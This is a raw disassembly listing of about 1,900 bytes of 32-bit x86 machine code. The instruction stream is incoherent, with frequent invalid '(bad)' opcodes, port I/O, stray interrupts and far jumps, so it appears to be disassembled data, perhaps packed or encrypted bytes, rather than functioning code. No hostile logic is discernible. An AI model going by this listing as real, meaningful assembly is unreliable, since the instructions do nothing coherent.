  40eaee:	cmovne ebp,DWORD PTR [ebx+eax*8-0x6a]
  40eaf3:	xor    BYTE PTR [edx-0x4d],ah
  40eaf6:	inc    esi
  40eaf7:	(bad)  
  40eaf8:	int    0x7e
  40eafa:	int    0x80
  40eafc:	(bad)  
  40eafd:	add    eax,0x1cd5ab6e
  40eb02:	bound  esi,QWORD PTR [eax-0x5de241e2]
  40eb08:	mov    ?,WORD PTR [esi]
  40eb0a:	(bad)  
  40eb0b:	ja     0x40eaec
  40eb0d:	rol    bl,1
  40eb0f:	inc    edi
  40eb10:	mov    BYTE PTR [ebx+0x48245adf],dh
  40eb16:	ficom  WORD PTR es:[ebx+ebx*2-0x26cbecdf]
  40eb1e:	shr    BYTE PTR [edx-0x988936d],1
  40eb24:	mov    esp,0xc4b344da
  40eb29:	(bad)  
  40eb2a:	neg    ecx
  40eb2c:	mov    DWORD PTR [eax+0x473be156],esi
  40eb32:	and    ebp,DWORD PTR [ebp+0x6]
  40eb35:	loop   0x40eafa
  40eb37:	cmp    eax,DWORD PTR ds:0x235e2191
  40eb3d:	in     al,dx
  40eb3e:	jge    0x40eacc
  40eb40:	pop    ebp
  40eb41:	push   ds
  40eb42:	mov    ecx,0x9aba23f2
  40eb47:	rcr    BYTE PTR [ebp+0x6a42e8ad],1
  40eb4d:	test   BYTE PTR [eax+0x3],0xf6
  40eb51:	das    
  40eb52:	mov    cl,0xc1
  40eb54:	fs cld 
  40eb56:	xchg   ebx,eax
  40eb57:	std    
  40eb58:	loop   0x40eb09
  40eb5a:	add    DWORD PTR [ecx+0x44789821],eax
  40eb60:	fidiv  WORD PTR [ebx-0x4c]
  40eb63:	fwait
  40eb64:	mov    ch,0x17
  40eb66:	lods   eax,DWORD PTR ds:[esi]
  40eb67:	push   edi
  40eb68:	mov    ds:0x133c5da3,al
  40eb6d:	shl    DWORD PTR [eax+ebx*1],1
  40eb70:	mov    eax,0xa25cf9a2
  40eb75:	das    
  40eb76:	arpl   WORD PTR [ebp-0x7e],ax
  40eb79:	or     bh,ah
  40eb7b:	std    
  40eb7c:	lds    edx,FWORD PTR [ebx+ebx*8]
  40eb7f:	out    dx,eax
  40eb80:	cs js  0x40eb7f
  40eb83:	aad    0x10
  40eb85:	loop   0x40eb21
  40eb87:	dec    eax
  40eb88:	sub    ecx,ebp
  40eb8a:	rol    DWORD PTR [edi+0x747410a3],0xd2
  40eb91:	push   cs
  40eb92:	adc    edi,eax
  40eb94:	ds bnd jae 0x40ec11
  40eb98:	xchg   edx,eax
  40eb99:	and    eax,esi
  40eb9b:	xor    ebx,DWORD PTR [ebp+0x70]
  40eb9e:	sbb    ah,BYTE PTR [ebp+0x5c]
  40eba1:	fisttp DWORD PTR [ebx+0x46]
  40eba4:	mov    ch,0xec
  40eba6:	inc    edi
  40eba7:	or     dh,BYTE PTR [ecx-0x38929e0b]
  40ebad:	test   BYTE PTR [edx+0x48],cl
  40ebb0:	pop    ds
  40ebb1:	int    0xe6
  40ebb3:	scas   eax,DWORD PTR es:[edi]
  40ebb4:	push   0x52ed228e
  40ebb9:	in     al,dx
  40ebba:	push   ebx
  40ebbb:	adc    BYTE PTR [esi+0x31],ch
  40ebbe:	mov    ds:0xa954dfd,al
  40ebc3:	mov    ebp,0xdca621f4
  40ebc8:	mov    edi,0xe0d7a3a
  40ebcd:	inc    edi
  40ebce:	dec    ebp
  40ebcf:	enter  0x7915,0xc
  40ebd3:	push   ebx
  40ebd4:	cld    
  40ebd5:	jnp    0x40eb81
  40ebd7:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ebd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebda:	inc    ebp
  40ebdb:	and    dh,BYTE PTR [ebx-0x11c14050]
  40ebe1:	ret    0x1bcf
  40ebe4:	push   ebx
  40ebe5:	xchg   ebx,eax
  40ebe6:	sub    bh,BYTE PTR [ebx]
  40ebe8:	std    
  40ebe9:	popf   
  40ebea:	or     al,0xa1
  40ebec:	jb     0x40ebb9
  40ebee:	loopne 0x40ebd7
  40ebf0:	inc    edx
  40ebf1:	test   al,0xb2
  40ebf3:	jb     0x40ec47
  40ebf5:	mov    BYTE PTR [ebx+0x55],bl
  40ebf8:	sub    esp,esp
  40ebfa:	mov    esi,0x8bd9a776
  40ebff:	push   ss
  40ec00:	xchg   esp,eax
  40ec01:	dec    esp
  40ec02:	mul    BYTE PTR [edx-0x58d9152d]
  40ec08:	inc    eax
  40ec09:	jge    0x40ebce
  40ec0b:	push   ds
  40ec0c:	inc    esi
  40ec0d:	adc    al,0xdf
  40ec0f:	dec    ebp
  40ec10:	cwde   
  40ec11:	pop    ebx
  40ec12:	(bad)  
  40ec13:	mov    edi,0x7cc48274
  40ec18:	in     eax,dx
  40ec19:	cmp    eax,0xe98eb74a
  40ec1e:	sahf   
  40ec1f:	inc    DWORD PTR [ebx+esi*8-0x7d]
  40ec23:	and    DWORD PTR [ecx+eax*1-0x20c11d03],esp
  40ec2a:	inc    esi
  40ec2b:	adc    BYTE PTR [ecx-0x36],al
  40ec2e:	jne    0x40ec61
  40ec30:	out    dx,al
  40ec31:	add    ah,BYTE PTR [esi]
  40ec33:	inc    edi
  40ec34:	es push cs
  40ec36:	popa   
  40ec37:	dec    esi
  40ec38:	cmp    al,0xf9
  40ec3a:	loop   0x40ec3b
  40ec3c:	xchg   DWORD PTR [edx],esi
  40ec3e:	not    ebp
  40ec40:	mov    eax,DWORD PTR [eax+0x5b]
  40ec43:	in     eax,dx
  40ec44:	xchg   BYTE PTR [ebx],dh
  40ec46:	popf   
  40ec47:	sbb    eax,0xdf6f225d
  40ec4c:	dec    edx
  40ec4d:	inc    ebp
  40ec4e:	pop    ss
  40ec4f:	scas   al,BYTE PTR es:[edi]
  40ec50:	sbb    al,bh
  40ec52:	inc    esp
  40ec53:	mov    ?,WORD PTR [ecx]
  40ec55:	push   cs
  40ec56:	fistp  DWORD PTR [eax+esi*8+0x7]
  40ec5a:	pop    ecx
  40ec5b:	mov    bl,0xff
  40ec5d:	test   al,0x65
  40ec5f:	push   ds
  40ec60:	push   ds
  40ec61:	adc    ebx,esp
  40ec63:	stc    
  40ec64:	mov    ds:0x2e86d52c,eax
  40ec69:	pop    ebp
  40ec6a:	or     DWORD PTR [ebp-0x1cc42396],ebx
  40ec70:	call   0xeacd:0x6c2a74
  40ec77:	mov    cl,0x22
  40ec79:	cwde   
  40ec7a:	pop    ds
  40ec7b:	sub    esi,DWORD PTR [ebx+0x3ed13389]
  40ec81:	in     al,0xae
  40ec83:	call   0x188b4c97
  40ec88:	xchg   DWORD PTR [edi+0x39be1585],esp
  40ec8e:	jmp    0x40ecf1
  40ec90:	inc    BYTE PTR [esi+0x5605940a]
  40ec96:	sahf   
  40ec97:	jb     0x40ed12
  40ec99:	sti    
  40ec9a:	je     0x40ec2f
  40ec9c:	rcl    BYTE PTR [esp+edi*1+0x2f],1
  40eca0:	xor    esp,DWORD PTR [ebx-0x4f2dac7a]
  40eca6:	retf   0xdb95
  40eca9:	(bad)  
  40ecaa:	mov    ah,0xe6
  40ecac:	neg    BYTE PTR [ecx-0x3d8812b3]
  40ecb2:	xor    DWORD PTR [esi],ebp
  40ecb4:	pushf  
  40ecb5:	or     bh,0xd5
  40ecb8:	mov    edx,0x9d3bb9a2
  40ecbd:	inc    eax
  40ecbe:	jno    0x40ed3e
  40ecc0:	fsub   st,st(6)
  40ecc2:	jp     0x40ecc0
  40ecc4:	dec    ecx
  40ecc5:	int    0xab
  40ecc7:	push   0xf5f26430
  40eccc:	cmp    BYTE PTR [eax+0x2d],bh
  40eccf:	push   0xcb2db301
  40ecd4:	add    cl,BYTE PTR cs:[eax]
  40ecd7:	push   cs
  40ecd8:	pop    ecx
  40ecd9:	js     0x40ec80
  40ecdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecdc:	and    al,0x53
  40ecde:	mov    dh,BYTE PTR [ecx]
  40ece0:	pop    ecx
  40ece1:	cld    
  40ece2:	cmp    edi,DWORD PTR [edi-0x3e]
  40ece5:	fst    QWORD PTR [edx]
  40ece7:	inc    eax
  40ece8:	add    eax,0x33590c00
  40eced:	es xchg edx,eax
  40ecef:	mov    ebx,DWORD PTR [edx+0xece5021]
  40ecf5:	dec    ebx
  40ecf6:	int    0xd1
  40ecf8:	push   0x579ea20e
  40ecfd:	mov    edi,0xb2e02e95
  40ed02:	(bad)  
  40ed03:	(bad)  [edi+0x73788b10]
  40ed09:	pop    ecx
  40ed0a:	sbb    eax,0x980b62cf
  40ed0f:	fcmovbe st,st(7)
  40ed11:	fst    QWORD PTR [ebp+ecx*4+0x44]
  40ed15:	mov    eax,0x9a7153b2
  40ed1a:	mov    eax,ds:0x110f5722
  40ed1f:	mov    ecx,0x380f3669
  40ed24:	cmp    al,0xbf
  40ed26:	bsf    edi,DWORD PTR [ecx-0x6729c525]
  40ed2d:	jne    0x40eccc
  40ed2f:	cld    
  40ed30:	xchg   ebx,eax
  40ed31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed32:	pop    esi
  40ed33:	mov    edx,0x8d14af4
  40ed38:	imul   ebp,DWORD PTR [ecx-0x20],0x78fce351
  40ed3f:	fmul   DWORD PTR [eax+0x1b]
  40ed42:	int    0x32
  40ed44:	cwde   
  40ed45:	cmp    eax,0xd66aa8cc
  40ed4a:	and    BYTE PTR [esi],dl
  40ed4c:	in     eax,0x69
  40ed4e:	arpl   WORD PTR [eax],di
  40ed50:	mov    ecx,0x2350929
  40ed55:	cmp    edi,0x55
  40ed58:	daa    
  40ed59:	enter  0x378b,0x48
  40ed5d:	int    0x15
  40ed5f:	out    dx,eax
  40ed60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed61:	mov    eax,0xd0b9f580
  40ed66:	shr    dl,1
  40ed68:	lods   eax,DWORD PTR ds:[esi]
  40ed69:	push   ds
  40ed6a:	out    dx,eax
  40ed6b:	cwde   
  40ed6c:	sub    esi,DWORD PTR [edx-0x55240c38]
  40ed72:	pand   mm4,mm2
  40ed75:	outs   dx,DWORD PTR ds:[esi]
  40ed76:	das    
  40ed77:	mov    al,ds:0xc9601207
  40ed7c:	jb     0x40ed25
  40ed7e:	sbb    eax,0x9d8181cb
  40ed83:	mov    WORD PTR [ebx+0x55],cs
  40ed86:	fsubr  st(0),st
  40ed88:	daa    
  40ed89:	adc    eax,0xf64d86f6
  40ed8e:	pushf  
  40ed8f:	(bad)  
  40ed90:	mov    bh,0x3c
  40ed92:	outs   dx,DWORD PTR ds:[esi]
  40ed93:	cwde   
  40ed94:	(bad)
  40ed97:	ror    DWORD PTR [eax],cl
  40ed99:	jl     0x40edea
  40ed9b:	and    BYTE PTR [eax-0x309e2402],0x6
  40eda2:	jne    0x40edb9
  40eda4:	mov    BYTE PTR [ebp-0x2ff17271],ah
  40edaa:	sbb    ecx,DWORD PTR [ebp-0x24]
  40edad:	rcl    BYTE PTR ds:0x378e7de8,0xa0
  40edb4:	sub    BYTE PTR [ebp*1+0x39186327],0xf
  40edbc:	cmp    al,BYTE PTR [ecx+ecx*4]
  40edbf:	xchg   esp,eax
  40edc0:	mov    ds:0x1fca65a2,al
  40edc5:	add    BYTE PTR [ecx+esi*1+0x52d09cb1],dh
  40edcc:	nop
  40edcd:	inc    esp
  40edce:	add    eax,0x6f8afb04
  40edd3:	fwait
  40edd4:	cmp    ah,ah
  40edd6:	stos   DWORD PTR es:[edi],eax
  40edd7:	inc    esp
  40edd8:	out    0xef,al
  40edda:	(bad)  
  40eddb:	mov    edx,ss
  40eddd:	xor    bh,dh
  40eddf:	cmp    DWORD PTR [ebp+0x2b977cd9],0x478b8262
  40ede9:	aad    0xa9
  40edeb:	repnz test DWORD PTR ds:[esi],edi
  40edef:	mov    al,BYTE PTR [edx-0x1f66be55]
  40edf5:	sbb    al,0xb4
  40edf7:	leave  
  40edf8:	ret    
  40edf9:	push   eax
  40edfa:	push   ds
  40edfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edfc:	push   cs
  40edfd:	push   ss
  40edfe:	jp     0x40ed8f
  40ee00:	push   edx
  40ee01:	xlat   BYTE PTR ds:[ebx]
  40ee02:	out    dx,al
  40ee03:	adc    DWORD PTR [ebx-0x5f],edx
  40ee06:	adc    eax,0x1a1c1ecc
  40ee0b:	push   ds
  40ee0c:	mov    ds:0xaf186234,eax
  40ee11:	psrlq  mm5,QWORD PTR [ecx+0x32]
  40ee15:	pop    eax
  40ee16:	jae    0x40ee06
  40ee18:	jge    0x40ee49
  40ee1a:	cli    
  40ee1b:	rol    BYTE PTR [esi+0x4b],cl
  40ee1e:	inc    ebp
  40ee1f:	mov    edi,0x2b2b08a3
  40ee24:	daa    
  40ee25:	and    ah,BYTE PTR [eax+0x66]
  40ee28:	inc    dl
  40ee2a:	int3   
  40ee2b:	push   eax
  40ee2c:	mov    al,0x72
  40ee2e:	and    al,0x12
  40ee30:	dec    ebx
  40ee31:	jecxz  0x40ee94
  40ee33:	xlat   BYTE PTR ds:[ebx]
  40ee34:	pop    edx
  40ee35:	stos   BYTE PTR es:[edi],al
  40ee36:	inc    esp
  40ee37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee38:	mov    esi,DWORD PTR [ebp+ebp*2+0x30]
  40ee3c:	push   ss
  40ee3d:	arpl   WORD PTR [ebx+0x49],bx
  40ee40:	pusha  
  40ee41:	dec    esi
  40ee42:	sub    edx,DWORD PTR [esi]
  40ee44:	add    BYTE PTR [edi+0x6db90184],dh
  40ee4a:	and    eax,edi
  40ee4c:	(bad)  
  40ee4d:	fidiv  DWORD PTR [edi]
  40ee4f:	sub    al,BYTE PTR [edi+eax*4-0x5eaf11eb]
  40ee56:	dec    eax
  40ee57:	cld    
  40ee58:	push   eax
  40ee59:	outs   dx,BYTE PTR ds:[esi]
  40ee5a:	mov    ebp,0xfd415675
  40ee5f:	scas   al,BYTE PTR es:[edi]
  40ee60:	aad    0x5e
  40ee62:	and    eax,0x5f1a009c
  40ee67:	jb     0x40ee2f
  40ee69:	outs   dx,BYTE PTR ds:[esi]
  40ee6a:	loopne 0x40ee1e
  40ee6c:	in     al,dx
  40ee6d:	jle    0x40ee40
  40ee6f:	push   esp
  40ee70:	add    edi,ecx
  40ee72:	popf   
  40ee73:	iret   
  40ee74:	lahf   
  40ee75:	mul    al
  40ee77:	xor    eax,0xf4cefcc2
  40ee7c:	sub    DWORD PTR [edi+ebp*2],esi
  40ee7f:	daa    
  40ee80:	inc    ebx
  40ee81:	icebp  
  40ee82:	pop    esi
  40ee83:	add    eax,0x37fe24d6
  40ee88:	mov    esi,0xa6f9863f
  40ee8d:	dec    edx
  40ee8e:	in     eax,dx
  40ee8f:	inc    edx
  40ee90:	inc    ebp
  40ee91:	fist   WORD PTR [ecx-0x711fbf5f]
  40ee97:	inc    esi
  40ee98:	shr    DWORD PTR [ebx+0x7e],1
  40ee9b:	cmp    DWORD PTR [edx-0x3],ecx
  40ee9e:	add    BYTE PTR [ebp-0x2c6735c6],cl
  40eea4:	cmc    
  40eea5:	cmc    
  40eea6:	mov    dh,BYTE PTR [ebp+edi*2+0x64bb5911]
  40eead:	sti    
  40eeae:	push   ebp
  40eeaf:	jmp    0xe879:0x7333519f
  40eeb6:	jp     0x40ee95
  40eeb8:	push   ss
  40eeb9:	xor    ebx,DWORD PTR [eax]
  40eebb:	cdq    
  40eebc:	in     eax,dx
  40eebd:	and    cl,0xa6
  40eec0:	outs   dx,BYTE PTR ds:[esi]
  40eec1:	sbb    BYTE PTR [edx+0x6f62a6a4],ah
  40eec7:	into   
  40eec8:	hlt    
  40eec9:	and    DWORD PTR [ecx+0x76],esp
  40eecc:	loopne 0x40eee4
  40eece:	pusha  
  40eecf:	xchg   edx,eax
  40eed0:	outs   dx,BYTE PTR ds:[esi]
  40eed1:	inc    ebx
  40eed2:	xchg   esp,eax
  40eed3:	(bad)  
  40eed4:	into   
  40eed5:	jg     0x40eef0
  40eed7:	mov    dl,0xcc
  40eed9:	shr    DWORD PTR ds:0x4ce8a8d2,cl
  40eedf:	push   ss
  40eee0:	push   0x8558d9c0
  40eee5:	aam    0xfa
  40eee7:	xor    DWORD PTR [ecx],ebx
  40eee9:	jmp    0x40ef27
  40eeeb:	hlt    
  40eeec:	jae    0x40ef2f
  40eeee:	shr    BYTE PTR [edi+0x19],1
  40eef1:	xor    eax,0x888568e9
  40eef6:	xchg   esi,eax
  40eef7:	adc    eax,DWORD PTR [edx]
  40eef9:	xchg   edx,eax
  40eefa:	jmp    0x40ee98
  40eefc:	add    DWORD PTR [ecx],0xeff337a0
  40ef02:	cmp    BYTE PTR [ebp-0x645644a4],0x49
  40ef09:	jmp    0xda8d:0x889aed4c
  40ef10:	or     BYTE PTR [ebx],cl
  40ef12:	jmp    0x40eebe
  40ef14:	ds xor ebp,ecx
  40ef17:	cmp    BYTE PTR [ebx],cl
  40ef19:	into   
  40ef1a:	adc    bx,si
  40ef1d:	std    
  40ef1e:	dec    ecx
  40ef1f:	sar    DWORD PTR [edx-0x24],cl
  40ef22:	adc    al,0x24
  40ef24:	sahf   
  40ef25:	sub    DWORD PTR [ebx+0x5e1baf61],ebp
  40ef2b:	sbb    eax,0x2c3ad3d
  40ef30:	daa    
  40ef31:	dec    edi
  40ef32:	imul   ebx,DWORD PTR [edx],0x3cf57d3c
  40ef38:	or     DWORD PTR [ecx],ecx
  40ef3a:	add    eax,0xa35a5ea9
  40ef3f:	xlat   BYTE PTR ds:[ebx]
  40ef40:	add    al,0x3a
  40ef42:	fcmovu st,st(6)
  40ef44:	sbb    ah,BYTE PTR [esi+0x66]
  40ef47:	or     esp,eax
  40ef49:	fcom   DWORD PTR [eax-0x66]
  40ef4c:	xor    esp,DWORD PTR [ecx]
  40ef4e:	je     0x40ef6f
  40ef50:	stc    
  40ef51:	push   eax
  40ef52:	in     al,dx
  40ef53:	mov    dh,0xec
  40ef55:	leave  
  40ef56:	rcr    BYTE PTR [ebx-0x7a9747c0],cl
  40ef5c:	push   cs
  40ef5d:	jnp    0x40ef66
  40ef5f:	adc    ecx,DWORD PTR ds:0xce5abe54
  40ef65:	pop    ecx
  40ef66:	jne    0x40efa6
  40ef68:	test   esp,ebp
  40ef6a:	jae    0x40efe9
  40ef6c:	inc    edi
  40ef6d:	mov    ds:0xa445e3d4,al
  40ef72:	bound  esi,QWORD PTR [ecx+eax*2+0x22]
  40ef76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef77:	or     al,0x28
  40ef79:	sub    DWORD PTR [ecx-0x78a31a7f],ebp
  40ef7f:	pop    edx
  40ef80:	adc    eax,0x3a3ee565
  40ef85:	mov    ds:0x77ce4816,al
  40ef8a:	and    DWORD PTR [ecx+0x2d],ecx
  40ef8d:	dec    esi
  40ef8e:	dec    eax
  40ef8f:	jb     0x40efdb
  40ef91:	clc    
  40ef92:	(bad)
  40ef95:	jl     0x40efb2
  40ef97:	sub    ecx,edx
  40ef99:	xor    DWORD PTR [ebx*1+0x4c6b52fd],esp
  40efa0:	sub    al,0xe5
  40efa2:	in     eax,0xb7
  40efa4:	or     DWORD PTR [esi],0x83631791
  40efaa:	mov    esi,0x6c008dce
  40efaf:	and    eax,DWORD PTR [edi-0x9]
  40efb2:	cmovo  edx,DWORD PTR [edi+0x2a4cd361]
  40efb9:	or     cl,BYTE PTR [edx-0x2e]
  40efbc:	(bad)  
  40efbe:	fs mov dh,0xf7
  40efc1:	push   eax
  40efc2:	imul   al
  40efc4:	inc    ecx
  40efc5:	inc    ebp
  40efc6:	dec    eax
  40efc7:	push   esp
  40efc8:	ss loope 0x40efd7
  40efcb:	push   es
  40efcc:	test   DWORD PTR [ecx+0x7a],0xe43a9421
  40efd3:	mov    ebp,0xcfec6b39
  40efd8:	mov    al,ds:0x684a6a8b
  40efdd:	das    
  40efde:	or     DWORD PTR [ecx+0x15],eax
  40efe1:	mov    ah,0x67
  40efe3:	lods   al,BYTE PTR ds:[esi]
  40efe4:	mov    eax,ds:0xaad2dce3
  40efe9:	mov    ebp,0x5a95a28d
  40efee:	mov    bh,0x2d
  40eff0:	ds adc ebx,esp
  40eff3:	mov    esp,DWORD PTR [edx+0x13d8040]
  40eff9:	shr    DWORD PTR [edx+ebx*8],cl
  40effc:	and    al,0x6a
  40effe:	test   DWORD PTR [ebx-0x10],esi
  40f001:	aas    
  40f002:	addr16 test ebx,edi
  40f005:	jl     0x40efe3
  40f007:	sbb    al,dl
  40f009:	fs jb  0x40f026
  40f00c:	call   FWORD PTR [esi-0x5c]
  40f00f:	cmp    esi,DWORD PTR [ebx-0x5bb0f633]
  40f015:	cwde   
  40f016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f017:	add    ebp,ecx
  40f019:	inc    edx
  40f01a:	ret    0xc08b
  40f01d:	jne    0x40f09a
  40f01f:	rcl    esi,0x4b
  40f022:	retf   
  40f023:	mov    DWORD PTR [ebp-0x79],ebx
  40f026:	mov    ah,0x4
  40f028:	cmp    BYTE PTR [edi],dl
  40f02a:	xor    ecx,eax
  40f02c:	jecxz  0x40f06f
  40f02e:	pop    edx
  40f02f:	xchg   ebx,eax
  40f030:	mov    esp,0x7b62e75
  40f035:	add    al,0xb5
  40f037:	adc    edi,0xffffff8b
  40f03a:	cmp    BYTE PTR [esi],0xae
  40f03d:	dec    ebx
  40f03e:	pop    ss
  40f03f:	sbb    esi,DWORD PTR [edi-0x6d]
  40f042:	cmp    BYTE PTR [edi-0x1ba4fed4],dl
  40f048:	pushf  
  40f049:	adc    eax,0x72f155ab
  40f04e:	dec    eax
  40f04f:	test   eax,0x3ccaa3b0
  40f054:	les    ebp,FWORD PTR [ebp-0x1be9c965]
  40f05a:	js     0x40f010
  40f05c:	bound  ecx,QWORD PTR [eax-0x76dd33fa]
  40f062:	push   cs
  40f063:	mov    ds:0x6a39aeab,eax
  40f068:	xchg   ebp,eax
  40f069:	mov    ebp,0xd9fb350f
  40f06e:	mov    ds:0xf47e0ad8,al
  40f073:	push   esi
  40f074:	xchg   ecx,eax
  40f075:	pop    esp
  40f076:	pop    eax
  40f077:	xor    esi,eax
  40f079:	jg     0x40f047
  40f07b:	sub    BYTE PTR [edx-0x1e],dh
  40f07e:	inc    esp
  40f07f:	sub    DWORD PTR [ebp-0x3a99f40a],edx
  40f085:	push   esp
  40f086:	sub    al,0x93
  40f088:	jo     0x40f0af
  40f08a:	fdiv   QWORD PTR [ecx+0x6baf8a39]
  40f090:	or     BYTE PTR [edi-0xc],al
  40f093:	lods   al,BYTE PTR ds:[esi]
  40f094:	sbb    eax,DWORD PTR [esi-0x4c]
  40f097:	mov    esi,0x890120b0
  40f09c:	jmp    0xab02:0x739d414d
  40f0a3:	and    edx,DWORD PTR [ecx+0x477e9b52]
  40f0a9:	mov    eax,0xce9e3dbc
  40f0ae:	adc    eax,0x8090a3e1
  40f0b3:	pop    eax
  40f0b4:	sbb    dl,dh
  40f0b6:	(bad)  
  40f0b7:	jmp    0x40f08b
  40f0b9:	push   ebx
  40f0ba:	retf   
  40f0bb:	sbb    ah,cl
  40f0bd:	dec    esp
  40f0be:	pop    esi
  40f0bf:	inc    esp
  40f0c0:	xchg   ebp,eax
  40f0c1:	mov    eax,0x6e62ff16
  40f0c6:	repz mov al,0xd8
  40f0c9:	mov    ds:0xaf818e81,al
  40f0ce:	repnz mov DWORD PTR [ebx-0x5a14d3c6],0x69ff7e66
  40f0d9:	lds    ebp,FWORD PTR [eax-0x5d8a62df]
  40f0df:	jns    0x40f0ac
  40f0e1:	push   0x4a
  40f0e3:	sub    eax,DWORD PTR [eax+0x37a50b27]
  40f0e9:	cli    
  40f0ea:	shr    DWORD PTR [edx-0x6861bb7d],0xe
  40f0f1:	pop    eax
  40f0f2:	scas   eax,DWORD PTR es:[edi]
  40f0f3:	mov    al,0x5d
  40f0f5:	arpl   WORD PTR [esi+edi*4+0x7b],bx
  40f0f9:	cmp    DWORD PTR [edx-0x20f70860],ecx
  40f0ff:	pop    eax
  40f100:	pop    esi
  40f101:	mov    ch,0x99
  40f103:	xor    al,BYTE PTR [ecx+ecx*1+0xa]
  40f107:	call   0x8f09:0x40aa9909
  40f10e:	repz out dx,eax
  40f110:	icebp  
  40f111:	lods   al,BYTE PTR ds:[esi]
  40f112:	inc    esp
  40f113:	repz pop esp
  40f115:	in     eax,0xd
  40f117:	jge    0x40f130
  40f119:	aad    0xe3
  40f11b:	push   ds
  40f11c:	ss xchg ebp,eax
  40f11e:	arpl   WORD PTR ds:0xd31435bb,bx
  40f124:	mov    esp,DWORD PTR [ebp+0xbe907e0]
  40f12a:	jbe    0x40f113
  40f12c:	test   eax,0xdc3fb145
  40f131:	pusha  
  40f132:	stos   BYTE PTR es:[edi],al
  40f133:	push   edi
  40f134:	fdivr  QWORD PTR [ebp-0x89081b]
  40f13a:	sbb    DWORD PTR [edx],edx
  40f13c:	pop    eax
  40f13d:	dec    esp
  40f13e:	inc    eax
  40f13f:	retf   
  40f140:	sub    dl,BYTE PTR [esi]
  40f142:	ret    0xc63d
  40f145:	in     al,0xa6
  40f147:	inc    edi
  40f148:	leave  
  40f149:	sub    DWORD PTR [esi],ecx
  40f14b:	jge    0x40f108
  40f14d:	mov    bh,0xd6
  40f14f:	xor    eax,0x1b7371e2
  40f154:	dec    esp
  40f155:	es out 0xe2,eax
  40f158:	inc    ecx
  40f159:	sar    ch,0x36
  40f15c:	outs   dx,BYTE PTR ds:[esi]
  40f15d:	xlat   BYTE PTR ds:[ebx]
  40f15e:	jne    0x40f169
  40f160:	idiv   esi
  40f162:	add    ah,BYTE PTR [ecx]
  40f164:	sub    DWORD PTR [ebx],eax
  40f166:	test   DWORD PTR [eax+0x442a5f99],0x53c46647
  40f170:	cli    
  40f171:	mov    bl,0x6a
  40f173:	inc    eax
  40f174:	pop    esp
  40f175:	shr    dh,1
  40f177:	or     esp,DWORD PTR [edi]
  40f179:	rcr    BYTE PTR [ecx],cl
  40f17b:	test   esp,eax
  40f17d:	or     BYTE PTR [esi],ah
  40f17f:	or     ah,BYTE PTR [edi+0x4b9f3c3]
  40f185:	aaa    
  40f186:	jns    0x40f1b3
  40f188:	(bad)
  40f18b:	sbb    eax,DWORD PTR [edx+eiz*4]
  40f18e:	or     DWORD PTR [eax],ebp
  40f190:	rcl    DWORD PTR [edi-0x4ca50ab4],1
  40f196:	cmc    
  40f197:	jg     0x40f1d8
  40f199:	dec    ecx
  40f19a:	pop    edx
  40f19b:	adc    ecx,0xc441abf1
  40f1a1:	int    0xa0
  40f1a3:	cmp    al,0x58
  40f1a5:	lea    ebx,[edi-0x263e12ae]
  40f1ab:	inc    esi
  40f1ac:	call   0xed0d7003
  40f1b1:	mov    ds:0x564b7e42,al
  40f1b6:	and    DWORD PTR [edx+ebx*1],esp
  40f1b9:	in     eax,0x8c
  40f1bb:	mov    esi,0xc3bda855
  40f1c0:	jecxz  0x40f17b
  40f1c2:	into   
  40f1c3:	xchg   ebx,eax
  40f1c4:	adc    al,0x39
  40f1c6:	cmp    esi,0xffffff8e
  40f1c9:	pop    eax
  40f1ca:	arpl   bp,di
  40f1cc:	jg     0x40f235
  40f1ce:	aas    
  40f1cf:	leave  
  40f1d0:	jg     0x40f170
  40f1d2:	xor    eax,0x47531491
  40f1d7:	inc    ecx
  40f1d8:	pop    si
  40f1da:	pop    esi
  40f1db:	lds    esi,FWORD PTR [ebx-0x4]
  40f1de:	push   esi
  40f1df:	jno    0x40f257
  40f1e1:	sbb    DWORD PTR [esp+esi*8],0x4c6f20bc
  40f1e8:	mov    ch,0x39
  40f1ea:	sub    BYTE PTR [eax+0x96085e4],dl
  40f1f0:	sub    al,0x8f
  40f1f2:	rcl    ebp,cl
  40f1f4:	jmp    0xcf15:0xed9d89aa
  40f1fb:	jmp    0xebe8c6a9
  40f200:	scas   eax,DWORD PTR es:[edi]
  40f201:	pop    esi
  40f202:	aaa    
  40f203:	scas   al,BYTE PTR es:[edi]
  40f204:	pop    esp
  40f205:	jl     0x40f256
  40f207:	rcr    DWORD PTR [eax+0x1b3a37e7],0x77
  40f20e:	xchg   ebx,eax
  40f20f:	aad    0x8
  40f211:	push   esi
  40f212:	scas   eax,DWORD PTR es:[edi]
  40f213:	mov    ecx,0xe44a604c
  40f218:	add    ah,BYTE PTR [eax]
  40f21a:	ret    0xbe77
  40f21d:	or     DWORD PTR [ebp-0x4e],edx
  40f220:	sub    edx,eax
  40f222:	pop    ss
  40f223:	(bad)  
  40f224:	fsub   st,st(4)
  40f226:	mov    eax,ds:0x6220303e
  40f22b:	push   edi
  40f22c:	fwait
  40f22d:	pop    edx
  40f22e:	or     eax,0xaadcca2
  40f233:	mov    esp,0x50ba0305
  40f238:	test   eax,0x295b508e
  40f23d:	fild   QWORD PTR [edx+0x1eef4f6]
  40f243:	xchg   edi,esi
  40f245:	adc    dl,BYTE PTR [esi-0x12]
  40f248:	dec    ebp
  40f249:	or     edi,ecx
  40f24b:	jae    0x40f242
  40f24d:	ror    DWORD PTR [ecx],1
  40f24f:	jae    0x40f1f5
  40f251:	add    ecx,DWORD PTR [eax-0xb]
  40f254:	pop    ebx
  40f255:	fsub   QWORD PTR [ecx+0x5fa09ad2]
  40f25b:	xor    eax,0x7b4fce83
  40f260:	cwde   
  40f261:	imul   ebx,DWORD PTR [esi+0x62],0x79910783
  40f268:	call   0x1a939d6f
  40f26d:	pop    eax
  40f26e:	mov    esi,0x4d11a3c1
  40f273:	push   ds
  40f274:	shr    BYTE PTR [ecx],cl
  40f276:	outs   dx,DWORD PTR ds:[esi]
  40f277:	cmp    eax,DWORD PTR [edx-0x45]
  40f27a:	dec    ebx
  40f27b:	mov    bl,0x67
